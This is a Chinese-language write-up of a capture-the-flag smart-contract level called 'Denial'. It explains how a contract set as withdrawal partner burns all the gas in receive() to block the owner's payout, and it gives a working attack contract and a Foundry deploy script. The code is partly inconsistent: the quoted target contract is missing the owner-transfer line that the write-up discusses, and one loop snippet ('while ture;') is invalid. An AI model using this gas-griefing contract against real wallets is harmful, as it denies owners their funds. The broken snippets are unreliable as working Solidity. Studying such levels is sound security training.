# Denial 耗尽gas

## 目标合约

这是一个简单的钱包，会随着时间的推移而流失资金。您可以成为提款伙伴，慢慢提款。

通关条件：在owner调用withdraw()时拒绝提取资金（合约仍有资金，并且交易的gas少于1M）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//这是一个简单的钱包，会随着时间的推移而流失资金。您可以成为提款伙伴，慢慢提款。
//通关条件： 在owner调用withdraw()时拒绝提取资金（合约仍有资金，并且交易的gas少于1M）。
contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
       
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

* 合约仍有资金,交易的gas少于1M：这句一开始理解错了,以为是要控制交易的gas少于1M,所以想不通为什么用循环(因为循环会一直消耗gas),也就是我错误理解的是累加,题目的意思是累减

## 思路

写一个攻击合约,赶在给owner钱之前把gas消耗完,就是这句之前

```solidity
 payable(owner).transfer(amountToSend);
```

首先调用`setWithdrawPartner()`成为partner

接着调用`withdraw()`,关键就在`withdraw()`

### receive()函数里引发revert可不可行?

(当合约接收ETH的时候，`receive()`会被触发)

比如这样

```solidity
receive() external payable{
    revert();
}
```

**不行。**

withdraw()里这句

```solidity
partner.call{value: amountToSend}("");
```

是未经检查的低级调用,没有接收返回值,,如果在receive()里revert,确实是拦住了下边的语句执行.

但是,注意通关条件"在owner调用withdraw()时拒绝提取资金（合约仍有资金，**并且交易的gas少于1M**）"

```solidity
(bool success, ) = address(level).call{gas: 999_999}(
    abi.encodeWithSignature("withdraw()")
);
require(!success, "Level not passed");
```

所以需要把gas消耗完,才能顺利阻止把钱给owner,以及接下来的语句执行

### 死循环消耗完gas

可以在receive()里这么写

```solidity
receive() external payable{
    while ture;
}
```

这样就把gas消耗完了

或者

```solidity
receive() external payable{
    assert(false);//solidity0.8之前
}
```

```solidity
receive() external payable{
    assembly{
        invalid()
    }//solidity0.8及以上
}
```

## 攻击合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Denial} from "./Denial.sol";

contract Attack {
    Denial public iroha;//iroha是变量,随便起

    constructor(address addr) {
        iroha = Denial(payable(addr));
        iroha.setWithdrawPartner(address(this));
        iroha.withdraw();
    }

    receive() external payable {
        assembly {
            invalid()
        }
    }
}
```

## 脚本

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Attack} from "../src/Attack.sol";
import {Script} from "forge-std/Script.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack iroha = new Attack(0xAdC9AEE5D07Dc2a797Fec54B712fF6cAAE4555aF);

        vm.stopBroadcast();
    }
}
```


> 更新: 2025-07-11 10:59:52  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/epu6w775k2kvhw5f>